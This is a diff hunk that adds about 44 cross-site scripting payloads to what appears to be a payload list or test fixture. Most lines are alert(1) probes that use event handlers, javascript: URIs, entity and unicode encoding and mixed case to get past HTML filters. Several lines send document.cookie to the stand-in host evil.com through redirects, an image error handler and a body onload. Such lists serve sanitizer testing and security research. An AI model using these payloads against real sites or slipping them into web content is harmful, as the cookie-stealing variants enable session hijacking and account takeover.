@@ -18,3 +18,47 @@
 <video poster="javascript:alert(1)"></video>
 <audio src="x" onerror="alert(1)"></audio>
 <source src="javascript:alert(1)">
+<script>document.cookie</script>
+<script>window.location='http://evil.com/?c='+document.cookie</script>
+<img src=1 onerror="this.src='http://evil.com/'+document.cookie">
+<body onload="document.location='http://evil.com/'+document.cookie">
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<audio src=x onerror=alert(1)>
+<object type="text/html" data="javascript:alert(1)">
+<embed src="data:text/html,<script>alert(1)<\/script>">
+<svg><script>alert(1)</script></svg>
+<math><script>alert(1)</script></math>
+<svg onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>window['alert'](1)</script>
+<script>top['alert'](1)</script>
+<script>self['alert'](1)</script>
+<script src="data:,alert(1)"></script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',9999)</script>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
+<a href="jAvAsCrIpT:alert(1)">click</a>
+<a href="javascript&#58;alert(1)">XSS</a>
+<a href="  javascript:alert(1)">XSS</a>
+<img src=`x`onerror=alert(1)>
+<img src='x' onerror='alert(1)'>
+<img/src=x onerror=alert(1)>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<link rel=import href="data:text/html,<script>alert(1)<\/script>">
+<meta http-equiv="refresh" content="0; url=javascript:alert(1)">
+<base href="javascript:alert(1)//">
+<form><button formaction="javascript:alert(1)">X</button></form>
+<isindex type=image src=1 onerror=alert(1)>
+<table background="javascript:alert(1)"></table>
+<script>/*</script><script>*/alert(1)</script>
+<script>\u0061lert(1)</script>
+<script>a\u006cert(1)</script>
+<script>al\u0065rt(1)</script>
